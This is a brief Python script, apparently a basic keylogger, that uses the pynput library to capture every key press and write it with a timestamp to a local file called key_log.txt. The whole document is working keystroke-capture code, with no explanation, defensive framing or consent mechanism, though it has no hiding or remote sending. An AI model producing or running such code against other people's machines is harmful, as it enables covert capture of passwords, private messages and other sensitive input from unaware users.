import logging
import pynput


logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)


with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
